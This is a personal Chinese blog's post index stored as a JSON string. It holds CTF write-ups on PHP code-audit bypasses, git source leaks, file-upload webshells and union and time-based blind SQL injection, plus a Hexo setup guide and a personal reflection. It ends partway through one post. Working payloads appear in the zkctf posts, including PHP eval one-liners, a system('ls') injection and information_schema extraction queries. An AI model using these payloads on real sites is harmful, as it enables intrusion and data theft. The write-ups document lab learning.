	var s = '[{"title":"2019ISCC web1 （代码审计）","date":"2019-05-03T02:11:27.000Z","content":"2019ISCC web1题目\n题解拿到题目直接给出源码：\n1234567891011121314151617&lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value = $_GET[&apos;value&apos;];$password = $_GET[&apos;password&apos;];$username = &apos;&apos;;for ($i = 0; $i &lt; count($value); ++$i) &#123;    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);    else $username .= chr($value[$i]);    if ($username == &apos;w3lc0me_To_ISCC2019&apos; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;        echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;        echo $flag, &apos;&lt;hr&gt;&apos;;    &#125;&#125;highlight_file(__FILE__);\n在for循环内，当元素的值在32-127时，销毁value的值，在32-127范围之外的value值通过chr函数返回对应于ascii所指定字符，.=累加到$username上。\n看源码：\n当满足if ($username == ‘w3lc0me_To_ISCC2019’ &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)时输出flag\n$username第一个字母w所对应的ascii码为119，在32-127范围内，因为chr()函数会自动进行mod256，所以可以传参119+256得到w，写了一个c++脚本跑出了value的值\n123456789101112#include&lt;iostream&gt;using namespace std;int main()&#123;\tchar a[30]=&quot;w3lc0me_To_ISCC2019&quot;;\tint i;\tfor(i=0;i&lt;19;i++)\t&#123;\t\tprintf(&quot;%d,&quot;,(int)a[i]+256);\t&#125;\treturn 0; &#125;\n为375,307,364,355,304,365,357,351,340,367,351,329,339,323,323,306,304,305,313\n接着看if语句，发现intval($password) &lt; 2333和intval($password + 1) &gt; 2333要同时满足，查阅函数，得知intval函数在参数是字符串的情况下，只会返回第一个字母之前的数值，如果第一个就是字母则返回0.\n所以我们可以令password=0xaaaa（所传参数会自动当成字符串处理），此时intval($password)=0&lt;2333,字符串$password和数字相加会先转换成数字再相加，所以满足intval($password + 1) &gt; 2333\n所以传参：\n1?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0xaaaa\n得到：Hello w3lc0me_To_ISCC2019!\nflag{8311873e241ccad54463eaa5d4efc1e9}\n\n知识点总结count — 返回数组中元素的数目unset — 释放给定的变量chr — 返回相对应于 ascii 所指定的单个字符   此外，chr()函数会自动进行mod256\n1234官网上的注释为： Note that if the number is higher than 256, it will  return the number mod 256. For example : chr(321)=A because A=65(256)\nintval — 获取变量的整数值\nintval函数，在如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是’-‘，则从第二个开始算起。 如果参数是符点数，则返回他取整之后的值。当var是一个array时候，var为空则返回0，不为空则返回1\n\n所以intval(“12ab34”) 返回的是12\n123456789官网注释为：     It seems intval is interpreting valid numeric strings differently between PHP 5.6 and 7.0 on one hand, and PHP 7.1 on the other hand.    &lt;?php    echo intval(&apos;1e5&apos;);    ?&gt;        will return 1 on PHP 5.6 and PHP 7.0,    but it will return 100000 on PHP 7.1.\n","tags":["writeup","代码审计"],"path":"2019/05/03/2019ISCC-web1-（代码审计）/","external_link":""},{"title":"git源码泄露","date":"2019-11-04T11:46:56.000Z","content":"\nGit的简介Git是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。是为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。\nGit具有以下特点：\n\n开发者可以提交到本地，每个开发者通过克隆（git clone），在本地机器上拷贝一个完整的Git仓库。（也是分布式相比于集中式的最大区别）\n公共服务器压力和数据量都不会太大。\n速度快、灵活。\n任意两个开发者之间可以很容易的解决冲突。\n离线工作。\n代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。\n\n漏洞产生的原因一些开发人员在开发时为了让版本控制和网站部署变得方便，会先将仓库托管在Coding或者Github上，开发好后，直接将源码打包上传进行解压。\n可是由于在目录中初始化一个仓库后，会在这个目录下产生一个名叫.git的文件夹，这个文件夹里保存了这个仓库的所有版本信息。如果开发者没有将这个文件夹删除，则会造成源码泄露，攻击者可以利用这个文件还原重建工程代码，进一步进行代码审计，挖掘文件上传、sql注入等漏洞。\n同时，如果网站涉及到数据库操作，则可能导致链接数据库需要的用户名、密码、端口、库名等信息从源码中泄露，一旦服务器开放了数据库的远程连接功能，攻击者就可以使用从源码中得到的用户名密码进行登录，造成更多安全隐患。\n\n附：.git文件夹详解及git仓库下两个文件\n\nREADME.md ：对code source的介绍，相当于注释作用，通常涵盖项目介绍、代码所实现的功能、系统环境参数、部署要素、代码组织架构等内容\n.gitignore ：配置 git 需要忽略的文件或文件夹，从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志配置文件等敏感文件\n\n\ngit漏洞的利用使用GitHack工具下载地址 https:github.comlijiejieGitHack\nGitHack是一个.git泄露利用脚本，只需要下载到本地，cd到所在文件夹，执行1python githack.py http:xxx.x.x.x.git\n 命令\n 这里我们用Jarvis oj的一道题做演示，题目地址http:web.jarvisoj.com:32798  运行结束后得到文件 \n爬虫爬取整个git目录这种方法跟使用githack工具相比，好处在于可以完全模拟服务器上的代码环境，跟踪到git的每一次提交，得到git提交日志中可能存在的开发人员对每一次commit的描述，例如对某个bug的修复，进而进行白盒审计。\n操作过程\n在linux下利用wget对该目录进行递归下载\n\n12345wget -r -p -np -k http:www.xxx.com.git--recursive（递归）-k,  --convert-links（转换链接）-p,  --page-requisites（页面必需元素）-np, --no-parent（不追溯至父级）\n\n下载完成后，进入下载的目录3.执行命令git log，查看网站的提交记录4.执行命令gir reset –hard [log hash]，恢复到指定版本号，只需要源码的话就恢复到最近一次的提交\n\n解决办法\n对.git目录的访问权限进行控制\n在每次pull之后删除.git文件夹\n\n\n参考链接：https:www.jianshu.compedae09535ea3\n","tags":["web安全"],"path":"2019/11/04/git源码泄露/","external_link":""},{"title":"zkctf 代码审计","date":"2019-05-06T03:09:42.000Z","content":"涉及知识点：ereg函数存在00截断的漏洞zkctf一道代码审计的题，代码如下：1234567891011121314151617181920212223242526272829303132&lt;?php include(&quot;.flag.php&quot;); show_source(__FILE__); error_reporting(0); $a=$_GET[&apos;a&apos;]; if(stripos($a,&apos;.&apos;)) &#123;     echo &apos;Hahahahahaha&apos;;     die(); &#125; $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;1433223!!!&quot;)&#123;     if (isset ($_GET[&apos;password&apos;]))     &#123;         if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)&#123;             echo &apos;You password must be alphanumeric&apos;;         &#125;else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)&#123;             if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE)             &#123;                 die(&apos;Flag: &apos; . $flag);             &#125;else&#123;                 echo(&apos;- have not been found&apos;);             &#125;         &#125;else&#123;             echo &apos;Invalid password&apos;;         &#125;     &#125; &#125;else&#123;     echo &apos;Unhappy!&apos;; &#125; ?&gt;\n分析代码得知，要拿到flag需要满足五个条件：1.$data==1433223!!!2.isset ($_GET[‘password’]，password值存在3.ereg (“^[a-zA-Z0-9]+$”, $_GET[‘password’]) === FALSE，password值中含有任意字母或数字。4.strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999，password的字符长度小于8，且值大于9999999。5.strpos ($_GET[‘password’], ‘-‘) !== FALSE，在password中存在”-“。\n要满足第一个条件$data==1433223!!!，需要再分析代码12$a=$_GET[&apos;a&apos;];$data = @file_get_contents($a,&apos;r&apos;);\n可知data的值是通过以只读方式打开名为a的文件，且文件内容为1433223!!!，利用php:input，使a=php:input，该文件内容为post内容，post方式传入1433223!!!即可满足第一个条件。\n接着通过get传参满足第二第三个条件，第四个条件password的长度不能大于8，且值要大于999999，我们可以用科学记数法达到这个条件。最后一个条件在password中存在”-“，看起来很容易达到，但是再结合第三个条件password值中只能含有字母或数字，就知道需要通过别的方法绕过了，通过查询知道ereg函数存在00截断的漏洞，ereg函数在遇到%00会被截断，之后的就不会再判断，所以我们可以把”-“写在%00后面。综上，我们可以把password的值设为1e9%00-，%00算一个字符，一共5个字符，满足长度小于8的条件\n因此get传参：?a=php:input&amp;password=1e9%00-post传参：1433223!!!得到flag\n\n知识点总结：show_source ： 别名highlight_file()  高亮显示一个文件stripos — 查找字符串首次出现的位置（不区分大小写）strpos — 查找字符串首次出现的位置（区分大小写）file_get_contents — 将整个文件读入一个字符串isset — 检测变量是否已设置并且非 NULLereg — 正则表达式匹配preg_match — 执行匹配正则表达式\nereg函数有漏洞，可以进行00截断使用科学记数法可以使字符串长度缩短\n","tags":["代码审计","zkctf"],"path":"2019/05/06/zk-web-代码审计/","external_link":""},{"title":"zkctf friend","date":"2019-05-06T05:46:20.000Z","content":"涉及知识点：序列化、反序列化unserialize()、魔术方法__tostring又是一道代码审计的题，源码index.php：123456789101112131415161718192021222324252627282930313233&lt;?php include(&quot;.class.php&quot;); header(&quot;content-type:texthtml;charset=utf-8&quot;); error_reporting(0); if(isset($_GET[&quot;file&quot;]))&#123;     $file = $_GET[&quot;file&quot;];     if(isset($_GET[&quot;password&quot;]))&#123;         $password = $_GET[&quot;password&quot;];         if(preg_match(&quot;flag&quot;,$file))&#123;              echo &quot;不能现在就给你flag哦&quot;;             exit();           &#125;else&#123;               require_once($file);             highlight_file(&quot;$file&quot;);             $password = unserialize($password);              echo $password;         &#125;     &#125;else&#123;         echo &quot;需要密码的！&lt;br&gt;&quot;;     &#125; &#125;else&#123;     highlight_file(&apos;.index.php&apos;); &#125; if(preg_match(&quot;flag&quot;,$file))&#123;      echo &quot;不能现在就给你flag哦&quot;;     exit();   &#125;else&#123;       include($file);      $password = unserialize($password);      echo $password; &#125; ?&gt;\n看第一行代码，发现有一个class.php文件，但访问发现不能直接访问，但可以用php:filter将这个php文件中的代码以base64的形式输出在页面上通过base64解码，得到class.phpclass.php代码：\n12345678910111213&lt;!-- hello friend! --&gt;&lt;?php  class Flag&#123;flag_good.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file); \t\t\techo &quot;&lt;br&gt;&quot;;\t\treturn (&quot;good&lt;br&gt;&quot;);        &#125;      &#125;  &#125;  ?&gt;\n在这个文件中我们看到flag_good.php，推测flag应该在这个文件里，但是index.php里对file参数有限制不能包含flag，所以不能直接访问flag_good.php。再阅读代码，发现如果file的值中不包含flag，那么就能把这个文件包含进来，之后将password反序列化一下，并输出password的结果。在class.php中当Flag方法当做字符串执行时，会自动执行 tostring 方法（只知道这是个php魔术方法，具体作用是什么我也没搞懂，只是看别人写的wp知道是这样写然后拿的flag，emmmmm这个地方暂时存疑叭），如果file文件存在，就输出file文件中的内容。所以首先我们可以利用第一句require_once将class.php引进来，即让参数file=class.php，则在index.php也就有了Flag这一类的定义，最后就要靠password这个参数了，要让password成为一个Flag类，且password-&gt;file=’flag_good.php’，这样就可以在输出password的时候调用tostring这个方法。unserialize()函数是个反序列化函数，所以我们要构造一个序列化后的password，写个php脚本利用一下serialize()这个函数。得到我们需要的序列化结果将该值赋给password即可，所以构造url：\n1?file=class.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:13:&quot;flag_good.php&quot;;&#125;\n查看源代码即可拿到flag\n","tags":["代码审计","zkctf"],"path":"2019/05/06/zk-web-friend/","external_link":""},{"title":"zkctf部分wp","date":"2019-05-16T11:26:44.000Z","content":"zkctf部分题目的wp\nWeb upload打开题目地址发现是空白查看源代码看到upload.php所以把file改成upload.php，发现是个文件上传，且只能上传jpg格式的文件写php一句话木马上传时用bp抓包对比上传正常的jpg文件时的请求，把一句话的文件类型改成imagejpeggo一下发现上传成功接着用菜刀连接得到flag\nWeb warmup打开题目地址页面上只有一个haha…查看源代码发现一个index.php在url中添上index.php得到一段代码查阅assert函数：检查一个断言是否为 FALSE，如果 传入的值是字符串，它将会被 assert() 当做 PHP 代码来执行。所以可以令a=highlight_file(‘flag.php’); 高亮显示flag.php，并注释掉后面的代码（==$b都被注释掉了）阅读代码，当b!=Hello World!时程序结束并输出haha…所以先传入b的值：1?b=Hello%20word!&amp;a=highlight_file(%27flag.php%27);\n得到flag\nWeb where is flag因为有中英文按钮，发现可以文件上传用php:filter读取index.php,再用base64解码即可得到flag\nWeb sql-1判断回显位-1’ union select 1,2,3,4 #\n爆数据库-1’ union select database(),2,3,4 #【或：-1’ union select group_concat(schema_name),2,3,4 from information_schema.schemata #】\n爆sql1数据库的数据表-1’ union select  group_concat(table_name),2,3,4 from information_schema.tables where table_schema=’sql1’#\n爆 fl4g 表的列‘ union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=’fl4g’ #\n爆出flag‘ union select *,2,3,4 from fl4g #\nMisc dog下载的压缩包中含有一个flag.jpg和一个打开需要密码的flag.txt，把图片用记事本格式打开查找secret得到打开txt文件需要的密码，打开文件得到flag\nMisc real pass打开压缩包发现需要密码，尝试暴力破解但是提示该文件被损坏或是未加密文件于是猜想可能是伪加密，用WinHex打开发现源文件数据区加密区为09 00，改成00 00再打开就不需要密码，于是拿到flag。\nMisc hotdog用WinHex打开发现图片中还隐藏了一个flag.zip，将该图片用360压缩打开，得到打开flag.zip需要密码，密码由颜文字解密得到，解密网站https:tool.zcmzcm.orgaadecode输入密码打开flag.txt文件即拿到flag。\nMisc zkzkzk拼图得flag\nMisc 格式里的秘密图片用记事本打开搜索得到flag\n","tags":["zkctf"],"path":"2019/05/16/zkctf部分wp/","external_link":""},{"title":"zk十月赛","date":"2019-10-24T13:32:52.000Z","content":"easy-upload打开题目看见文件上传的页面，首先想到的是上传木马连菜刀。上传任意文件得到提示：文件只能是gif、jpg、png格式，所以上传一个图片文件，使用DOS命令在图片里插入一句话木马\n12一句话木马：&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;\n再次上传，得到提示不能有”&lt;?”使用123&lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;mc&apos;]);&lt;script&gt;\n绕过&lt;?的限制，再次上传，上传成功，并得到上传后的文件名。\n接着利用御剑进行爆破扫描，得到几个可利用的目录\n123.uploads.include.php...\n在.uploads里找到了自己上传的图片连接菜刀期待得到flag\n然后，连不上。。。\n在题目放了提示二次渲染之后，学习了一波关于二次渲染的知识，（在这里分享一波我们 温柔的！yang学长 的文章https:xz.aliyun.comt2657 太详细啦）大致的看了关于二次渲染的知识后就开始尝试绕过，由于我的脑回路新奇吧加上没好好看学长这篇文章，我选择了上传jpg格式的图片[手动微笑]，然后就开始了漫长的生成jpg图片马的过程，以及为了生成它漫长的安装php gd库的过程[再次微笑]\npng和jpg格式的文件绕过二次渲染比较麻烦，其实我们可以选择上传gif，只需要下载上传后的文件跟下载前的文件进行比对，找到渲染前后没有变化的位置,然后将php代码写进去即可成功绕过\n然后绕过之后，依然连不上菜刀hhhhhh\nbut代码执行不了可以构造命令执行1&lt;script language=php&gt;system(&quot;ls&quot;)&lt;script&gt;\npost传参访问图片的包含路径（刚刚扫描到的路径.include.php）看到一个，名为flag的文件，cat这个文件，得到flag\neasy_sql一道关于时间的盲注，过滤掉了一些字符第一步爆数据库\n1231&apos; union select * from (( select sleep(ascii(mid(database() from (1) for (1))) &gt;119))A join (select 2)B join (select 6)C) #一个字母一个字母的爆.....是不是有点菜了，得到数据库&quot;web&quot;\n第二步爆表\n1231&apos; union select * from (( select sleep(((ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema regexp database()) from (1) for (1)))) &lt; 97)(15)))A join (select 2)B join (select 3)C) #表名article\n第三步爆字段\n1231&apos; union select * from (( select sleep(((ascii(mid((select group_concat(column_name) from information_schema.columns where table_name regexp &apos;article&apos;) from (1) for (1)))) &lt; 105)(15)))A join (select 2)B join (select 3)C) #得到id,username,flag...\n第四步爆flag字段的数据\n11&apos; union select * from (( select sleep(((ascii(mid((select flag from article) from (1) for (1)))) &lt;102)(15)))A join (select 2)B join (select 3)C) #\n得到flag\n","tags":["zkctf","web"],"path":"2019/10/24/zk十月赛/","external_link":""},{"title":"zkctf部分wp2","date":"2019-05-28T12:35:15.000Z","content":"  zkctf部分wp2\nWeb guess game查看源代码，发现其实又是代码审计\n1234567891011121314151617181920212223242526272829&lt;!-- error_reporting(0);$flag = &quot;***********************&quot;;$invest = $_GET[&apos;invest&apos;];$rand = rand(2,50);  $len = strlen(trim($_GET[&apos;invest&apos;]));foreach ($_GET as $key =&gt; $value) &#123;    if(!is_numeric($value)||$value == &apos;0&apos;)&#123;        die(&apos;no no no!&apos;);    &#125;&#125;$money = number_format($invest*$rand);$money = intval(str_replace(&apos;,&apos;,&apos;&apos;,$money));$guess = intval($_GET[&apos;guess&apos;]);if ($guess == $money &amp;&amp; strlen($money)===$len) &#123;    echo $flag;&#125;else&#123;    echo &quot;这次的倍率是&quot;.$rand.&quot;，所以您中了&quot;.$money.&quot;元钱.&quot;;     echo &quot;&lt;br&gt;但是您的预期金额是&quot;.$_GET[&apos;guess&apos;].&quot;，没猜对，2333&quot;;&#125; --\n了解到rand函数作用为产生一个随机整数，在本题中产生2-50之间的随机数，要得到flag需要使guess的值等于money（即$invest*$rand）的值，并且money长度要与invest的长度相等。那我们可以直接直接bp爆破，猜一个guess，固定invest和guess的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag.\n得到flag的前半段\n同样的方法，可以得到flag的后半段\n\n本题知识点总结：\ntrim — 去除字符串首尾处的空白字符（或者其他字符）\nis_numeric — 检测变量是否为数字或数字字符串\nnumber_format — 以千位分隔符方式格式化一个数字\n格式：number_format ( float $number , int $decimals = 0 , string $dec_point = “.” , string $thousands_sep = “,” ) \n\n本函数可以接受1个、2个或者4个参数（注意：不能是3个）。number：你要格式化的数字decimals：要保留的小数位数dec_point：指定小数点显示的字符thousands_sep：指定千位分隔符显示的字符   \n\n\nMisc easy流量分析下载流量包用Wireshark打开，发现部分TCP流长度异常，追踪TCP流发现flag\nMisc 马男波杰克有话说下载得到一个名字为atool.png的图片，什么线索也没有得到，问了同学后知道这是一个atool解密，解密后得到flag。解密网址http:www.atool9.comsteganography.php\nMisc what用十六进制打开what发现末尾处PK，判定是rar文件，将文件头改成50 4B 03 04，再打开what压缩包，得到zyr文件，再用WinHex打开发现是PNG图片，用图片打开得到flag\nMisc 模糊的图片这个题照着网上搜到的wp做的这一道lsb隐写题，用StegSolve进行分析，发现在red plane 0这里是纯黑的，说明这里什么也没有，正常的图片都不会是这样子的，其它通道也都显示正常。那我们要从其他的通道比如：blue、alpha、green中找些到信息。整张图片看起来是毫无规则的像素点，那一定想把真正的信息隐藏起来，再用一些毫无规则的像素点干扰我们。我们如果想得到其中的信息，就要去掉这些干扰点。但是到底去掉哪些呢。经过前面的步骤我们知道了信息可能隐藏在plane 0中，所以我们要先把各个通道的plane 0提取出来。Red plane 0因为是空信息，可以不用提取了。我们提取出（File-&gt;Save as）Green plane 0、Alpha plane 0、Blue plane 0，把他们各另存为一张图。然后各个图进行比对（Analyse-&gt;image Combiner），最后发现Alpha plane 0 和Green plane 0 异或运算下的图出现了flag。\nMisc 看得到吗？打开图片，观察到图片的宽和高差距太大，十六进制打开，修改图片的宽高打开看到flag\n","tags":["zkctf"],"path":"2019/05/28/zkctf部分wp2/","external_link":""},{"title":"“如何使用hexo+github搭建博客”","date":"2019-04-03T07:56:55.000Z","content":"使用hexo+github搭建博客\n嗯，搭建这个博客真的是历尽艰辛，所以第一篇博客记录一下我搭建的时候遇见了哪些问题，其实全程都是按网上的教程走的，（想想都是一把辛酸泪），只是最后给博客做加工美化的时候请教了一下大佬，在此特别感谢大佬帮小萌新操作，谢谢谢谢。\n首先，搭建博客需要安装\n1. git下载地址https:git-scm.comdownloadwin \n2. node.js下载地址https:nodejs.orgen \n3. hexo\n前两个就不用说了，直接下载就行，安装好以后，打开CMD命令窗口，输入npm -v，如果出现版本号，则说明安装成功了并且环境变量也配置好了，如果是未知命令那就要配置一下环境变量。\n\n安装hexo安装hexo时要首先在本地磁盘建立一个Hexo文件夹用于存储本地文件\n\n然后再这个文件夹里点击右键打开git命令框\n\n在git命令框中安装Hexo（没有安装git的情况下，可以找网上用cmd窗口安装的教程，不过我没有试过）\n安装hexo的命令是npm install -g hexo\n\n打开cmd窗口，输入hexo -v，如果出现版本号则说明安装成功\n\n然后初始化hexo init\n\n初始化完成后启动服务启动服务(npm install –&gt;hexo server –&gt;hexo clean –&gt;hexo generate –&gt;hexo deploy)\n\n\n\n\n最后进行本地测试。++（注意访问本地页面的时候hexo server不可以按ctrl+c停止服务，否则会报404）++\n如果页面没有报404但是进不去，可能是因为端口被占用了，用hexo s -p5000把端口改成5000，再访问一下，就可以进去了\n\n注册github\n\n\n找到我们的博客仓库，并拷贝仓库地址\n找到我们博客根目录下的_config.yml修改目录的配置\n\n修改deploy下的配置如下（注意冒号后有空格）\n\n最后执行控制台命令npm install hexo-deployer-git安装部署插件hexo d 部署到github\n\n最后执行hexo clean –&gt;hexo generate –&gt;hexo deploy你就可以看到你的博客了\n\n记住，每次修改配置信息或者其他都必须要执行步骤hexo g 、hexo d，才可以使得配置信息生效。\n\n根据自己的的系统自行选择下载安装，下载地址https:desktop.github.com\n下载安装好之后登陆你的github.从你的仓库添加到本地\n\n\n\nhexo new 新建一篇文章之后可以预览（localhost：4000）了\n\n从本地访问成功后执行hexo d部署到github\n\n这时再刷新 username.github.io 就可以看到你的博客了。\n我在搭建博客过程中遇到的问题\n执行npm install -g hexo安装命令时出现错误\n\n\n然后我执行了npm cache clean –force强制清理了一下cache才安装成功\n\n\n这一步出错一般是提示权限错误，就是node_modules中某个文件无权限操作，要求使用rootadmistrator用户运行命令。这个问题的解决其实并非单纯的权限问题，当然首先用管理员用户运行命令试一下，linux用户可以在命令前加sudo，windows系统需要以管理员身份运行cmd终端窗口。如果没有解决，因为本质是node.js安装模块的过程中出现的问题，可以试着用npm cache clean –force强制清理一下cache，然后重新运行npm install安装必要的模块\n\n\n初始化hexo init发生错误\n\n\n这个问题网上并没有提供解决的办法，可能是因为大家没有遇见过吧，然后我在寻找解决方法的时候注意到教程里有这样一句话“首先新建一个文件夹，位置随意，然后 cd 到这个文件夹下，运行命令：hexo init”\n然后我建了一个文件夹，cd到这个文件夹下，再运行这个命令，果然不假，进入了漫长的初始化生成过程\n\n进行本地测试时页面报错404\n\n原因是执行了hexo s后又按了ctrl+c终止attention：命令行里ctrl+c代表stop停止\n\n附：hexo中几个常用命令hexo generate (简写：hexo g)生成静态文件，会在当前目录下生成一个新的叫做public的文件夹\nhexo server (简写：hexo s) 启动本地web服务，用于博客的预览\nhexo deploy (简写：hexo d) 部署博客到远端（比如github, heroku等平台）\n$ hexo new “xxxx”（简写：hexo n） 新建文章\n$ hexo new page “pageName” #新建页面\n常用组合：\n$ hexo s -g #生成预览\n$ hexo d -g #生成部署\n","tags":[],"path":"2019/04/03/“如何使用hexo-github搭建博客”/","external_link":""},{"title":"一篇反省","date":"2019-09-25T15:49:34.000Z","content":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每天一篇博客不能断更，那我今天就不写技术文章了，今天想反思一下自己。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实验室的比赛从昨天到今天，有幸成为第一个解出web题的人，但只开心了一小会就不开心了，不但成就感没有了,也连学习的动力都没有了。因为觉得太难了，差不多写了一天，即使没有一天也实实在在的写了七个小时，觉得太难了，所以不想学了，即使大家都没有写出来我也觉得太难了我没有天赋学这个，即使大家都对这些知识点懵懵懂懂我也觉得太难了我学不会，我应该做些我有天分做好的事情，我甚至开始想如果大家都没有关注pwn、re，如果大家都是web手我还可能先写出来web题吗？我觉得不会，我还觉得我一点天分都没有，可是我的天分在哪呢？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我好像每做一件事情到了爬坡阶段时都会告诉自己“我一点天分都没有，我不想在这方面努力了”，所以我也没有做好过任何一件事情。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我一想到可能会很难的东西就会害怕，比如学php的时候没敲留言板现在想到留言板就觉得好难我不会，比如学盲注的时候迷茫了太久现在见到sql注入的题就只想放弃，我太害怕去尝试那些未知的而我又觉得难的事物了，又或是已知的我觉得难的事物，比如今天的题即使学长说很简单，我也只要一想到七个小时就觉得好难我不想学了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以我每一件事情都能做的不错，却每一件事情都不能做的出色，学习永远中等，永远不用努力就能当上老师口中的聪明学生；字写的永远不错，放在国内却也只算个一般水平；主持节目永远能叫人眼前一亮，比专业的却差了十万八千里；作文永远被当范文，总是被夸是才女，发表的文章却是一篇没有。从来没拔得头筹，却还为不上不下的尴尬境地沾沾自喜，因为觉得好简单啊，不用努力就能做的不错，可我也从来没有意识到，这个思想是对立面竟然是“努力会很难吧，还是放弃好了”。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;遇见不会写的题就觉得学习好难啊，我不适合学习；看见大家的书法就觉得这需要很多功夫吧，我还是慢慢练吧；想成为像董卿那样主持人，要做口腔操和气息训练时又觉得好累呀等以后再练吧； 想好好开发一下自己的写作天赋，但是每天练笔好难啊，以后再说吧；想成为朗朗那样的钢琴家想每天十二个小时练琴，练了两个小时之后：好累呀我什么都不想干了。我哪里是别人口中的多才多艺啊，分明就是个遇见困难就想逃跑的胆小鬼啊。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;胡适说怕什么真理无穷，进一步有一步的欢喜。我没怕真理无穷，我是怕真理太难，进一步需要一步的毅力。真想拿出高中写数学题的精神来，从不把任何难题放在眼里。可嘲讽的是，大学的数学却也让我畏惧，会不会很难？我会不会不适合学数学？之前能学好什么都是因为喜欢老师呀，没有老师我什么也学不好。我一直在这样给自己下定论，可我没有意识到，喜欢老师带给我的是不畏难的勇气，是相信自己一定能做到最好的信心，而离开了老师，我缺少的不是教育，是说服自己坚持学习的动力。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我想努力奔跑，从现在开始，追上那个曾经被寄予厚望的自己。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我要正视自己，不去躲避不去畏惧，怕什么路途险阻，进一步有一步的欢喜。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能永远都不会拥有“逢山开路，遇水架桥”的决心，但至少回过头来我能说，我或许败北，或许迷失自己，或许哪里也抵达不了，可至少我有值得等待值得追求的东西。\n","tags":["杂记"],"path":"2019/09/25/一篇反省/","external_link":""},{"title":"zk月赛","date":"2019-09-27T15:53:56.000Z","content":"这次web题考察的第一个知识点是robots协议，打开题目链接后只看到一个图片，在地址栏输入robots.txt，得到一个写着index.php.bak的界面，以.bak为后缀的都是备份文件，下载这个文件可以得到源代码，接下来开始对源码进行分析\n1234567891011121314151617181920212223242526272829303132333435&lt;?php$v1=$v2=$v3=0;error_reporting(0);$flag=&apos;flag&#123;******&#125;&apos;;header(&apos;content-type:texthtml;charset=utf-8&apos;);$m=@(string)$_GET[&apos;m&apos;];$n=@(string)$_GET[&apos;n&apos;];$a=@(string)$_POST[&apos;a&apos;];$b=@(string)$_POST[&apos;b&apos;];$c=@(string)$_POST[&apos;c&apos;];if(isset($_GET[&apos;num&apos;]))&#123;\t$num = intval($_GET[&apos;num&apos;]);\tif ($num==2333 &amp;&amp; $_GET[&apos;num&apos;]!=2333 &amp;&amp; $_GET[&apos;num&apos;]!=iconv(&quot;UTF-8&quot;,&quot;gbkIGNORE&quot;,$_GET[&apos;num&apos;])) &#123;\t\t$v1=1;\t\tif ($v1 &amp;&amp; $m!=$n &amp;&amp; md5($m)==md5($n) )&#123;\t\t\t$v2=1;\t\t\tif($v2 &amp;&amp; !( $a == $b || $a == $c || $b == $c )&amp;&amp; !(md5($a) !== md5($b) || md5($b) !== md5($c) || md5($a) !== md5($c)))&#123;\t\t\t\t$v3=1;\t\t\t\tif($v3)&#123;\t\t\t\t\techo &quot;$flag&quot;;\t\t\t\t&#125;\t\t\t&#125;\t\t\telse&#123;\t\t\t\tdie(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;h1&gt;&lt;img src=&apos;want.jpg&apos;&gt;&lt;center&gt;&quot;);\t\t\t&#125;\t\t&#125;else&#123;\t\t\tdie(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;h1&gt;&lt;img src=&apos;want.jpg&apos;&gt;&lt;center&gt;&quot;);\t\t&#125;\t&#125;else&#123;\t\tdie(&quot;&lt;center&gt;&lt;h1&gt;error!!!&lt;h1&gt;&lt;img src=&apos;want.jpg&apos;&gt;&lt;center&gt;&quot;);\t&#125;&#125;else&#123;\tdie(&quot;&lt;center&gt;&lt;h1&gt;Do you want flag?&lt;h1&gt;&lt;img src=&apos;want.jpg&apos;&gt;&lt;center&gt;&quot;);&#125;?&gt;\n首先观察到每一层的错误提示都是一样的，因此难以判断对错，所以把源码复制到本地改一下错误提示后开始绕过。第一层：\n1if ($num==2333 &amp;&amp; $_GET[&apos;num&apos;]!=2333 &amp;&amp; $_GET[&apos;num&apos;]!=iconv(&quot;UTF-8&quot;,&quot;gbkIGNORE&quot;,$_GET[&apos;num&apos;]))\n要求num的值为2333，但get到的num不为2333，查看源码发现1$num = intval($_GET[&apos;num&apos;]);\nnum进行了intval处理，会返回变量的整数值，因此可以输入小数来绕过$num==2333 &amp;&amp; 